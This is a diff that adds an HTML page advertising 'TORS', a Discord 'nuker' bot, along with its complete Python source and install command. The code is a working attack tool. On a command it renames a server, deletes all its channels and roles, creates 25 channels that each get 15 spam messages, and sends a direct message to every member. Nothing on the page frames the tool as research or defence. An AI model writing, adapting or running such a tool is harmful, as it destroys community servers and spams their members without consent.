@@ -1,0 +1,213 @@
+<style> 
+  body {
+        background-color: #121212;
+        color: #e0e0e0;
+        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        margin: 0;
+        padding: 0;
+    }
+
+ 
+
+    header h1 {
+        margin: 0;
+        font-size: 2.5rem;
+        color: #00bcd4;
+    }
+
+    main {
+        max-width: 900px;
+        margin: 2rem auto;
+        padding: 1rem;
+    }
+
+    section {
+        margin-bottom: 2rem;
+    }
+
+    h2 {
+        color: #00bcd4;
+        border-bottom: 1px solid #333;
+        padding-bottom: 0.5rem;
+        margin-bottom: 1rem;
+    }
+
+    pre {
+        background-color: #1f1f1f;
+        padding: 1rem;
+        overflow-x: auto;
+        border-radius: 8px;
+        border: 1px solid #333;
+    }
+
+    a.github-link {
+        display: inline-block;
+        margin-top: 1rem;
+        color: #00bcd4;
+        text-decoration: none;
+        font-weight: bold;
+    }
+
+    a.github-link:hover {
+        color: #00ffff;
+    }
+
+    ul {
+        list-style-type: disc;
+        padding-left: 2rem;
+    }
+
+    code {
+        background-color: #222;
+        padding: 2px 6px;
+        border-radius: 4px;
+        color: #ffeb3b;
+    }
+</style>
+</head>
+<body>
+
+<header>
+    <h1>...........................................................................TORS</h1>
+</header>
+
+<main>
+    <section>
+        <h2>About TORS</h2>
+        <p>
+            A quick discord nuker bot. It can delete roles, emojis, stickers, channels, rename the server, create new channels, send messages, and dm all members.
+        </p>
+    </section>
+
+    <section>
+        <h2>Features</h2>
+        <ul>
+            <li>Rename the server</li>
+            <li>Delete all channels, roles, emojis, and stickers</li>
+            <li>Create 25x new channels with custom messages</li>
+            <li>Send messages in channels efficiently (concurrent sending)</li>
+            <li>DM all members with a custom phrase</li>
+            <li>Triggered by a custom prefix command</li>
+        </ul>
+    </section>
+
+    <section>
+        <h2>Installation</h2>
+        <p>Install the required Python libraries with:</p>
+        <pre><code>pip install -U discord.py aiohttp</code></pre>
+    </section>
+
+    <section>
+        <h2>Source Code</h2>
+        <p>Below is the source code :</p>
+        <pre><code>
+import discord
+from discord.ext import commands
+import os
+import asyncio
+
+ascii_art = """
+  __________  ____  _____ 
+ /_  __/ __ \/ __ \/ ___/
+  / / / / / / /_/ /\__ \ 
+ / / / /_/ / _, _/___/ / 
+/_/  \____/_/ |_|/____/  
+(command : obliterate)
+"""
+
+def print_centered(text):
+    columns = os.get_terminal_size().columns
+    for line in text.splitlines():
+        print(line.center(columns))
+
+print_centered(ascii_art)
+
+TOKEN = input("bot token : ")
+
+PREFIX = input("command prefix : ")
+
+channel_name = input("channel name : ")
+
+message_text = input("channel message :  ")
+
+rename_server = input("rename server? (yes/no) : ").lower()
+if rename_server == "yes":
+    
+    new_server_name = input("enter server name : ")
+else:
+    new_server_name = None
+
+dm_phrase = input("enter dm phrase :  ")
+
+intents = discord.Intents.default()
+intents.guilds = True
+intents.members = True
+intents.emojis = True
+intents.message_content = True
+
+bot = commands.Bot(command_prefix=PREFIX, intents=intents)
+
+@bot.event
+async def on_ready():
+    print(f"{bot.user} is connected")
+
+@bot.command()
+async def obliterate(ctx):
+    guild = ctx.guild
+
+    if new_server_name:
+        try:
+            await guild.edit(name=new_server_name)
+        except Exception as e:
+            print(f"[!] failed to rename server {e}")
+
+    for channel in guild.channels:
+        try:
+            await channel.delete()
+        except Exception as e:
+            print(f"[!] failed to delete channels {channel.name}: {e}")
+
+    new_channels = []
+    for _ in range(25):
+        new_channel = await guild.create_text_channel(channel_name)
+        new_channels.append(new_channel)
+
+    async def send_messages(channel):
+        for _ in range(15):
+            await channel.send(message_text)
+
+    tasks = [send_messages(channel) for channel in new_channels]
+    await asyncio.gather(*tasks)
+
+    for role in guild.roles:
+        if role.name != "@everyone":
+            try:
+                await role.delete()
+            except Exception as e:
+                print(f"[!] failed to delete roles {role.name}: {e}")
+
+    for member in guild.members:
+        if not member.bot:
+            try:
+                await member.send(dm_phrase)
+            except Exception as e:
+                print(f"[!] failed to dm members {member.name}: {e}")
+
+    if new_channels:
+        await new_channels[0].send("** **")
+
+bot.run(TOKEN)
+
+        </code></pre>
+    </section>
+
+    <section>
+        <h2>GitHub</h2>
+        <a class="github-link" href="https://github.com/nicopancakes/Tors" target="_blank">
+            View on GitHub
+        </a>
+    </section>
+</main>
+
+</body>
+</html>
